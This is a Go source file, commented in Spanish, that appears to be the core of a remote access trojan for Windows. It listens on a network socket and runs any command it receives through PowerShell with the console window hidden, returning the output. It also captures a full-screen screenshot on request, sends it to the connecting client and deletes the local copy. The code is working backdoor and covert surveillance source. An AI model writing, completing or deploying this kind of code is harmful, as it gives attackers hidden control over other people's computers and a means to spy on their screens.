/*
en este modulo se maneja:

1. envio de comandos

2. ejecion de comandos

3. la puesta en escucha del programa en bucle
*/
package ejec

import (
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"image/png"
	"net"
	"os"
	"os/exec"
	"regexp"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
)

const TAMAÑO_BUFFER = 1024

// aca voy a poner la logica del startup y la ejecucion de comandos

// funcion similar a Envio( ) con la unica diferencia de que es para enviar imagenes por la red
func Enviar_img(conexion net.Conn, archivo string) error {
	buffer_img := make([]byte, 1_000_000)
	buffer_tamaño := make([]byte, 8)
	imagen, error := os.Open(archivo)
	if error != nil {
		return errors.New("no se encuentra la imagen")
	}
	n, error := imagen.Read(buffer_img)
	if error != nil {
		return errors.New("error al codificar imagen")
	}
	binary.BigEndian.PutUint64(buffer_tamaño, uint64(n))
	Envio(conexion, buffer_tamaño)
	Envio(conexion, buffer_img)

	error_close := imagen.Close()
	if error_close != nil {
		return error_close
	}
	err := os.Remove(archivo)
	if err != nil {
		return err
	}
	return nil
}

// Ss : screenshare -> maneja la logica cuando el cliente envia un paquete ss
func Ss(conexion net.Conn) error {
	nombre := "captura.png"
	bordes := screenshot.GetDisplayBounds(0)
	img, error := screenshot.CaptureRect(bordes)
	if error != nil {

		return error
	}
	arch, error := os.Create(nombre)
	err := png.Encode(arch, img)
	if err != nil {
		return err
	}
	error_close := arch.Close()
	if error_close != nil {
		return error_close
	}
	error_enviar := Enviar_img(conexion, nombre)
	if error_enviar != nil {
		return error_enviar
	}
	return nil
}

// funcion que implementa la logica del comando cd
func Cd(entrada string, cliente net.Conn) {
	ruta, error := regexp.Compile(`cd (\S+)`)
	if error != nil {
		fmt.Println(error)
	} else {
		re := ruta.FindStringSubmatch(entrada)
		if len(re) > 1 && len(re) < 3 {
			ruta_str := re[1]

			error := os.Chdir(ruta_str)
			if error != nil {
				Envio(cliente, []byte("[!] error cambiando ruta"))
			} else {
				Envio(cliente, []byte("[*] ruta actualizada"))
			}
		}
	}

}

// maneja la ejecucion de comandos
func Ejecucion(entrada string) ([]byte, error) {
	comando := exec.Command("powershell", "-command", entrada)

	comando.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // ocultar ventana de cmd
	salida, error := comando.CombinedOutput()
	return salida, error

}

/*
funcion que envia el contenido de la ejecucion

salida -> byte - salida del cmd
*/
func Envio(conexion net.Conn, salida []byte) error {

	// envio del contenido del comando
	_, err := conexion.Write(salida)
	if err != nil {
		return err
	}
	return nil
}

var ch_error = make(chan error)
var ch_salida = make(chan []byte)

func Escucha(conn net.Listener) {
	for {
		buffer := make([]byte, TAMAÑO_BUFFER)

		cliente, error := conn.Accept()
		if error != nil {
			fmt.Println(error)
		}

		n, error := cliente.Read(buffer) //recibir el paquete del cliente
		if error != nil {
			fmt.Println(error)
		}
		entrada := string(buffer[:n]) // trasformar el paquete en string

		match, _ := regexp.Match("cd ", []byte(entrada))
		if match { // logica de cd
			Cd(entrada, cliente)

		} else if entrada == "ss" { // logica de ss

			error := Ss(cliente)
			if error != nil {
				fmt.Println("error al hacer screenshot: ", error)
			}

		} else { // ejecucion de cualquier otro comando

			contexto, cancel := context.WithTimeout(context.Background(), time.Second*5)

			go func() {
				salida, error := Ejecucion(entrada)

				if error != nil {
					ch_error <- error
				} else {
					ch_salida <- salida
				}

			}()

			select {
			case <-contexto.Done():
				Envio(cliente, []byte("tiempo de ejecucion agotado"))
				cancel()
			case salida := <-ch_salida:

				err := Envio(cliente, salida)

				if err != nil {
					fmt.Println("hubo un problema al enviar")
				}

			case err := <-ch_error:

				fmt.Println("hubo un problema ", err)
			}

		}
	}
}
